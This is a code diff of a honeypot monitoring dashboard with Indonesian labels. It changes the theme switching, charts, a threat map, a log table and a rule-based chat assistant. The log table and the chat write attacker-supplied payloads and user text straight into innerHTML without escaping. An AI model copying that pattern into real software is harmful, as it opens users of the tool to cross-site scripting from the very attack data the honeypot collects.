-            if (localStorage.getItem('theme') === 'light') {
+            const savedTheme = localStorage.getItem('theme');
+            if (savedTheme === 'light') {
                 document.documentElement.classList.remove('dark');
-                document.documentElement.classList.add('light');
-                document.getElementById('themeIcon').className = 'fa-solid fa-sun text-amber-400';
+                document.getElementById('themeIcon').className = 'fa-solid fa-sun text-amber-500';
+            } else {
+                document.documentElement.classList.add('dark');
+                document.getElementById('themeIcon').className = 'fa-solid fa-moon text-slate-300';
             }
 
             ALL_LOGS = loadData();
@@ -647,45 +728,53 @@
             const isDark = document.documentElement.classList.contains('dark');
             if (isDark) {
                 document.documentElement.classList.remove('dark');
-                document.documentElement.classList.add('light');
                 localStorage.setItem('theme', 'light');
-                document.getElementById('themeIcon').className = 'fa-solid fa-sun text-amber-400';
+                document.getElementById('themeIcon').className = 'fa-solid fa-sun text-amber-500';
             } else {
-                document.documentElement.classList.remove('light');
                 document.documentElement.classList.add('dark');
                 localStorage.setItem('theme', 'dark');
-                document.getElementById('themeIcon').className = 'fa-solid fa-moon';
+                document.getElementById('themeIcon').className = 'fa-solid fa-moon text-slate-300';
             }
-            // Re-render map tiles theme if initialized
-            if (leafletMap) renderMap();
+            
+            updateChartThemeColors();
+            updateMapThemeLayer();
         }
 
         function switchTab(tabId) {
             document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
             document.getElementById('tab-' + tabId).classList.remove('hidden');
 
-            // Update Desktop Nav styles
+            // Update Page Title in Top Bar
+            const titles = {
+                dashboard: 'Dashboard',
+                threatmap: 'Threat Map Interaktif',
+                analisis: 'Analisis & Generator Laporan',
+                log: 'Log Mentah Honeypot',
+                ai: 'AI Security Analyst'
+            };
+            document.getElementById('pageTitle').innerText = titles[tabId] || 'Dashboard';
+
+            // Desktop Nav highlight
             document.querySelectorAll('.tab-btn').forEach(btn => {
-                btn.classList.remove('text-cyan-400', 'bg-slate-800/80');
-                btn.classList.add('text-slate-400');
+                btn.classList.remove('bg-gradient-to-r', 'from-purple-600', 'to-indigo-600', 'text-white', 'shadow-lg', 'shadow-purple-600/30');
+                btn.classList.add('text-slate-500', 'dark:text-slate-400');
             });
             const activeNav = document.getElementById('nav-' + tabId);
             if (activeNav) {
-                activeNav.classList.add('text-cyan-400', 'bg-slate-800/80');
-                activeNav.classList.remove('text-slate-400');
+                activeNav.classList.add('bg-gradient-to-r', 'from-purple-600', 'to-indigo-600', 'text-white', 'shadow-lg', 'shadow-purple-600/30');
+                activeNav.classList.remove('text-slate-500', 'dark:text-slate-400');
             }
 
-            // Update Mobile Nav styles
-            document.querySelectorAll('.mobile-tab').forEach(btn => btn.classList.replace('text-cyan-400', 'text-slate-400'));
+            // Mobile Nav highlight
+            document.querySelectorAll('.mobile-tab').forEach(btn => btn.classList.replace('text-purple-500', 'text-slate-400'));
             const activeMob = document.getElementById('mob-' + tabId);
-            if (activeMob) activeMob.classList.replace('text-slate-400', 'text-cyan-400');
+            if (activeMob) activeMob.classList.replace('text-slate-400', 'text-purple-500');
 
             if (tabId === 'threatmap') {
                 setTimeout(() => renderMap(), 200);
             }
         }
 
-        /* Global Timeline Change Filter Handler */
         function onGlobalTimelineChange() {
             const range = document.getElementById('globalTimeline').value;
             const now = new Date();
@@ -705,7 +794,7 @@
         }
 
         /* ==========================================================================
-           3. DASHBOARD TAB LOGIC & CHARTS
+           3. DASHBOARD LOGIC & CHARTS
            ========================================================================== */
         function updateDashboardMetrics() {
             const cyberCount = FILTERED_LOGS.filter(l => l.kategori === 'Siber').length;
@@ -714,7 +803,6 @@
             document.getElementById('cardTotalCyber').innerText = cyberCount.toLocaleString();
             document.getElementById('cardTotalMalware').innerText = malwareCount.toLocaleString();
 
-            // Calculate Country Rankings
             const countryCounts = {};
             FILTERED_LOGS.forEach(l => {
                 countryCounts[l.negara] = (countryCounts[l.negara] || 0) + 1;
@@ -727,27 +815,36 @@
                 document.getElementById('cardTopCountryCount').innerText = `${sortedCountries[0][1].toLocaleString()} Log (${Math.round(sortedCountries[0][1]/FILTERED_LOGS.length*100)}%)`;
             }
 
-            // Populate Ranking List UI
             const topListContainer = document.getElementById('topCountriesList');
             topListContainer.innerHTML = '';
             sortedCountries.slice(0, 5).forEach(([country, count], index) => {
                 const pct = Math.round((count / FILTERED_LOGS.length) * 100);
                 topListContainer.innerHTML += `
                     <div class="space-y-1">
-                        <div class="flex justify-between text-xs font-medium">
-                            <span class="text-slate-300">#${index + 1} ${country}</span>
-                            <span class="text-slate-400">${count.toLocaleString()} (${pct}%)</span>
+                        <div class="flex justify-between text-xs font-semibold">
+                            <span class="text-slate-700 dark:text-slate-300">#${index + 1} ${country}</span>
+                            <span class="text-slate-500 dark:text-slate-400">${count.toLocaleString()} (${pct}%)</span>
                         </div>
-                        <div class="w-full bg-slate-800 rounded-full h-1.5 overflow-hidden">
-                            <div class="bg-gradient-to-r from-rose-500 to-purple-500 h-1.5 rounded-full" style="width: ${pct}%"></div>
+                        <div class="w-full bg-slate-200 dark:bg-slate-800 rounded-full h-1.5 overflow-hidden">
+                            <div class="bg-gradient-to-r from-purple-500 to-pink-500 h-1.5 rounded-full" style="width: ${pct}%"></div>
                         </div>
                     </div>
                 `;
             });
         }
 
+        function getChartColors() {
+            const isDark = document.documentElement.classList.contains('dark');
+            return {
+                text: isDark ? '#94a3b8' : '#475569',
+                grid: isDark ? 'rgba(255, 255, 255, 0.06)' : 'rgba(0, 0, 0, 0.06)'
+            };
+        }
+
         function initCharts() {
-            // Chart 1: Timeline Line Chart
+            const c = getChartColors();
+
+            // Main Timeline Chart
             const ctxTimeline = document.getElementById('chartTimeline').getContext('2d');
             chartTimelineInstance = new Chart(ctxTimeline, {
                 type: 'line',
@@ -755,15 +852,15 @@
                 options: {
                     responsive: true,
                     maintainAspectRatio: false,
-                    plugins: { legend: { labels: { color: '#94a3b8', font: { size: 11 } } } },
+                    plugins: { legend: { display: false } },
                     scales: {
-                        x: { ticks: { color: '#64748b', font: { size: 10 } }, grid: { color: 'rgba(255,255,255,0.05)' } },
-                        y: { ticks: { color: '#64748b', font: { size: 10 } }, grid: { color: 'rgba(255,255,255,0.05)' } }
+                        x: { ticks: { color: c.text, font: { size: 10 } }, grid: { color: c.grid } },
+                        y: { ticks: { color: c.text, font: { size: 10 } }, grid: { color: c.grid } }
                     }
                 }
             });
 
-            // Chart 2: Attack Types Doughnut Chart
+            // Donut Attack Types Chart
             const ctxTypes = document.getElementById('chartTypes').getContext('2d');
             chartTypesInstance = new Chart(ctxTypes, {
                 type: 'doughnut',
@@ -771,17 +868,52 @@
                 options: {
                     responsive: true,
                     maintainAspectRatio: false,
-                    plugins: { legend: { position: 'bottom', labels: { color: '#94a3b8', font: { size: 10 } } } }
+                    cutout: '72%',
+                    plugins: { legend: { position: 'bottom', labels: { color: c.text, font: { size: 10 } } } }
                 }
+            });
+
+            // Mini Sparklines
+            const sparkOpts = {
+                responsive: true,
+                maintainAspectRatio: false,
+                plugins: { legend: { display: false }, tooltip: { enabled: false } },
+                scales: { x: { display: false }, y: { display: false } },
+                elements: { point: { radius: 0 }, line: { borderWidth: 2, tension: 0.4 } }
+            };
+
+            sparklineCyberInstance = new Chart(document.getElementById('sparklineCyber'), {
+                type: 'line',
+                data: { labels: [1,2,3,4,5,6,7], datasets: [{ data: [12,19,15,25,22,30,28], borderColor: '#f97316' }] },
+                options: sparkOpts
+            });
+
+            sparklineMalwareInstance = new Chart(document.getElementById('sparklineMalware'), {
+                type: 'line',
+                data: { labels: [1,2,3,4,5,6,7], datasets: [{ data: [8,11,18,14,24,20,32], borderColor: '#8b5cf6' }] },
+                options: sparkOpts
             });
 
             updateCharts();
         }
 
+        function updateChartThemeColors() {
+            if (!chartTimelineInstance || !chartTypesInstance) return;
+            const c = getChartColors();
+
+            chartTimelineInstance.options.scales.x.ticks.color = c.text;
+            chartTimelineInstance.options.scales.x.grid.color = c.grid;
+            chartTimelineInstance.options.scales.y.ticks.color = c.text;
+            chartTimelineInstance.options.scales.y.grid.color = c.grid;
+            chartTimelineInstance.update();
+
+            chartTypesInstance.options.plugins.legend.labels.color = c.text;
+            chartTypesInstance.update();
+        }
+
         function updateCharts() {
             if (!chartTimelineInstance || !chartTypesInstance) return;
 
-            // Group by date for timeline
             const daysMap = {};
             FILTERED_LOGS.forEach(l => {
                 const day = l.timestamp.split('T')[0];
@@ -797,13 +929,12 @@
             chartTimelineInstance.data = {
                 labels: sortedDays.map(d => d.substring(5)),
                 datasets: [
-                    { label: 'Serangan Siber', data: cyberData, borderColor: '#38bdf8', backgroundColor: 'rgba(56, 189, 248, 0.1)', fill: true, tension: 0.3 },
-                    { label: 'Serangan Malware', data: malwareData, borderColor: '#f43f5e', backgroundColor: 'rgba(244, 63, 94, 0.1)', fill: true, tension: 0.3 }
+                    { label: 'Serangan Siber', data: cyberData, borderColor: '#8b5cf6', backgroundColor: 'rgba(139, 92, 246, 0.15)', fill: true },
+                    { label: 'Serangan Malware', data: malwareData, borderColor: '#06b6d4', backgroundColor: 'rgba(6, 182, 212, 0.15)', fill: true }
                 ]
             };
             chartTimelineInstance.update();
 
-            // Group by Attack Type for Doughnut
             const typeMap = {};
             FILTERED_LOGS.forEach(l => {
                 typeMap[l.tipe_serangan] = (typeMap[l.tipe_serangan] || 0) + 1;
@@ -813,13 +944,12 @@
                 labels: Object.keys(typeMap),
                 datasets: [{
                     data: Object.values(typeMap),
-                    backgroundColor: ['#38bdf8', '#818cf8', '#f43f5e', '#10b981', '#f59e0b', '#ec4899', '#6366f1', '#14b8a6', '#a855f7']
+                    backgroundColor: ['#8b5cf6', '#d946ef', '#f97316', '#06b6d4', '#10b981', '#6366f1', '#ec4899', '#f59e0b', '#3b82f6']
                 }]
             };
             chartTypesInstance.update();
         }
 
-        /* Real-Time Live Stream Simulation */
         function initLiveStream() {
             const container = document.getElementById('liveStreamContainer');
             liveStreamInterval = setInterval(() => {
@@ -832,17 +962,17 @@
                 const timeStr = new Date().toLocaleTimeString();
 
                 const logEntry = document.createElement('div');
-                logEntry.className = 'p-2 rounded bg-slate-800/60 border border-slate-700/50 flex items-center justify-between animate-fade-in';
+                logEntry.className = 'p-2.5 rounded-2xl glass-input flex items-center justify-between border border-purple-500/10 animate-fade-in';
                 logEntry.innerHTML = `
                     <div class="flex items-center space-x-2">
-                        <span class="text-slate-500">[${timeStr}]</span>
-                        <span class="text-rose-400 font-bold">${ip}</span>
+                        <span class="text-slate-400">[${timeStr}]</span>
+                        <span class="text-purple-500 dark:text-purple-400 font-bold">${ip}</span>
                         <span class="text-slate-400">(${country.code})</span>
-                        <i class="fa-solid fa-arrow-right text-[10px] text-slate-600"></i>
-                        <span class="text-cyan-400 font-semibold">${node.id}</span>
+                        <i class="fa-solid fa-arrow-right text-[10px] text-slate-500"></i>
+                        <span class="text-cyan-500 font-semibold">${node.id}</span>
                     </div>
                     <div>
-                        <span class="px-2 py-0.5 rounded text-[10px] ${attack.category === 'Siber' ? 'bg-cyan-500/20 text-cyan-300' : 'bg-rose-500/20 text-rose-300'}">${attack.name}</span>
+                        <span class="px-2.5 py-0.5 rounded-full text-[10px] font-bold ${attack.category === 'Siber' ? 'bg-purple-500/15 text-purple-400' : 'bg-cyan-500/15 text-cyan-400'}">${attack.name}</span>
                     </div>
                 `;
 
@@ -858,18 +988,30 @@
         }
 
         /* ==========================================================================
-           4. THREAT MAP TAB LOGIC (Leaflet Map & Heatmap)
+           4. THREAT MAP TAB LOGIC
            ========================================================================== */
+        function updateMapThemeLayer() {
+            if (!leafletMap) return;
+            const isDark = document.documentElement.classList.contains('dark');
+            if (mapTileLayer) leafletMap.removeLayer(mapTileLayer);
+
+            const tileUrl = isDark 
+                ? 'https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png'
+                : 'https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}{r}.png';
+
+            mapTileLayer = L.tileLayer(tileUrl, {
+                attribution: '&copy; OpenStreetMap &copy; CARTO',
+                maxZoom: 18
+            }).addTo(leafletMap);
+        }
+
         function renderMap() {
             const container = document.getElementById('honeynetMap');
             if (!container) return;
 
             if (!leafletMap) {
                 leafletMap = L.map('honeynetMap').setView([20, 0], 2);
-                L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
-                    attribution: '&copy; OpenStreetMap &copy; CARTO',
-                    maxZoom: 18
-                }).addTo(leafletMap);
+                updateMapThemeLayer();
             }
 
             if (mapMarkersGroup) leafletMap.removeLayer(mapMarkersGroup);
@@ -877,15 +1019,13 @@
 
             mapMarkersGroup = L.layerGroup().addTo(leafletMap);
 
-            // Filter data category
             const categoryFilter = document.getElementById('mapCategoryFilter').value;
             const mapLogs = FILTERED_LOGS.filter(l => categoryFilter === 'all' || l.kategori === categoryFilter);
 
-            // Add Target Honeypot Nodes
             HONEYPOT_NODES.forEach(node => {
                 const nodeMarker = L.circleMarker([node.lat, node.lng], {
-                    radius: 9,
-                    fillColor: '#38bdf8',
+                    radius: 8,
+                    fillColor: '#06b6d4',
                     color: '#ffffff',
                     weight: 2,
                     opacity: 1,
@@ -895,13 +1035,11 @@
                 nodeMarker.bindPopup(`<b>Target Honeypot: ${node.id}</b><br>${node.name}`);
             });
 
-            // Prepare Heatmap Data
             const heatPoints = mapLogs.map(l => [l.lat, l.lng, 0.5]);
             mapHeatLayer = L.heatLayer(heatPoints, { radius: 25, blur: 15, maxZoom: 10 }).addTo(leafletMap);
 
-            // Draw Attack Arcs / Polylines (Sample top 50 recent attacks for performance)
             mapLogs.slice(0, 40).forEach(log => {
-                const lineColor = log.kategori === 'Siber' ? '#f43f5e' : '#a855f7';
+                const lineColor = log.kategori === 'Siber' ? '#8b5cf6' : '#d946ef';
                 const latlngs = [
                     [log.lat, log.lng],
                     [log.target_lat, log.target_lng]
@@ -923,7 +1061,7 @@
         }
 
         /* ==========================================================================
-           5. LOG HONEYPOT TAB LOGIC (Table, Filter, Pagination)
+           5. LOG HONEYPOT TAB LOGIC
            ========================================================================== */
         let currentFilteredLogs = [];
 
@@ -958,17 +1096,17 @@
             pageLogs.forEach(l => {
                 const dateStr = new Date(l.timestamp).toLocaleString();
                 tbody.innerHTML += `
-                    <tr class="hover:bg-slate-800/40">
-                        <td class="p-3 text-slate-400 whitespace-nowrap">${dateStr}</td>
-                        <td class="p-3 font-semibold text-cyan-400 whitespace-nowrap">${l.ip_penyerang}</td>
-                        <td class="p-3 whitespace-nowrap">${l.negara} (${l.negara_kode})</td>
-                        <td class="p-3 whitespace-nowrap">
-                            <span class="px-2 py-0.5 rounded text-[10px] ${l.kategori === 'Siber' ? 'bg-cyan-500/20 text-cyan-300' : 'bg-rose-500/20 text-rose-300'}">
+                    <tr class="hover:bg-purple-500/5">
+                        <td class="p-3.5 text-slate-400 whitespace-nowrap">${dateStr}</td>
+                        <td class="p-3.5 font-bold text-purple-500 dark:text-purple-400 whitespace-nowrap">${l.ip_penyerang}</td>
+                        <td class="p-3.5 whitespace-nowrap">${l.negara} (${l.negara_kode})</td>
+                        <td class="p-3.5 whitespace-nowrap">
+                            <span class="px-2.5 py-0.5 rounded-full text-[10px] font-bold ${l.kategori === 'Siber' ? 'bg-purple-500/10 text-purple-500' : 'bg-cyan-500/10 text-cyan-500'}">
                                 ${l.tipe_serangan}
                             </span>
                         </td>
-                        <td class="p-3 text-slate-300 whitespace-nowrap">${l.titik_honeypot}</td>
-                        <td class="p-3 text-slate-400 truncate max-w-xs" title="${l.payload}">${l.payload}</td>
+                        <td class="p-3.5 text-slate-700 dark:text-slate-300 whitespace-nowrap">${l.titik_honeypot}</td>
+                        <td class="p-3.5 text-slate-500 dark:text-slate-400 truncate max-w-xs" title="${l.payload}">${l.payload}</td>
                     </tr>
                 `;
             });
@@ -995,7 +1133,7 @@
         }
 
         /* ==========================================================================
-           6. REPORT GENERATOR (PDF & DOCX Export, Template Customizer)
+           6. REPORT GENERATOR
            ========================================================================== */
         function saveTemplateSettings() {
             const settings = {
@@ -1047,7 +1185,7 @@
         }
 
         function generateWordReport() {
-            const { Document, Packer, Paragraph, TextRun, HeadingLevel } = window.docx;
+            const { Document, Packer, Paragraph, HeadingLevel } = window.docx;
 
             const title = document.getElementById('reportTitleInput').value;
             const header = document.getElementById('reportHeaderInput').value;
@@ -1087,26 +1225,24 @@
             const query = input.value.trim();
             if (!query) return;
 
-            // Render User Message
             const chatContainer = document.getElementById('chatMessages');
             chatContainer.innerHTML += `
                 <div class="flex items-start justify-end space-x-3">
-                    <div class="bg-cyan-600/80 rounded-2xl p-3.5 max-w-xl text-white leading-relaxed">
+                    <div class="bg-gradient-to-r from-purple-600 to-indigo-600 rounded-2xl p-4 max-w-xl text-white leading-relaxed shadow-lg shadow-purple-600/20">
                         ${query}
                     </div>
                 </div>
             `;
             input.value = '';
 
-            // AI Answer Processing (Rule-based Placeholder Engine)
             setTimeout(() => {
                 const answer = askAI(query, FILTERED_LOGS);
                 chatContainer.innerHTML += `
                     <div class="flex items-start space-x-3">
-                        <div class="w-7 h-7 rounded-lg bg-purple-600/30 border border-purple-500/50 flex items-center justify-center text-purple-400 text-xs">
-                            <i class="fa-solid fa-robot"></i>
+                        <div class="w-8 h-8 rounded-xl bg-purple-600/20 border border-purple-500/30 flex items-center justify-center text-purple-400 font-bold">
+                            AI
                         </div>
-                        <div class="bg-slate-800/80 rounded-2xl p-3.5 max-w-xl text-slate-200 border border-slate-700/60 leading-relaxed">
+                        <div class="glass-panel rounded-2xl p-4 max-w-xl text-slate-800 dark:text-slate-200 leading-relaxed">
                             ${answer}
                         </div>
                     </div>
@@ -1115,12 +1251,6 @@
             }, 500);
         }
 
-        /*
-         * CATATAN INTEGRASI LLM API:
-         * Fungsi askAI di bawah ini bekerja secara lokal (rule-based). 
-         * Untuk menghubungkan dengan API LLM asli (misal: OpenAI / Claude / Gemini API):
-         * ganti logika fungsi ini dengan panggilan fetch API ke endpoint AI backend Anda.
-         */
         function askAI(question, dataContext) {
             const q = question.toLowerCase();
             const total = dataContext.length;
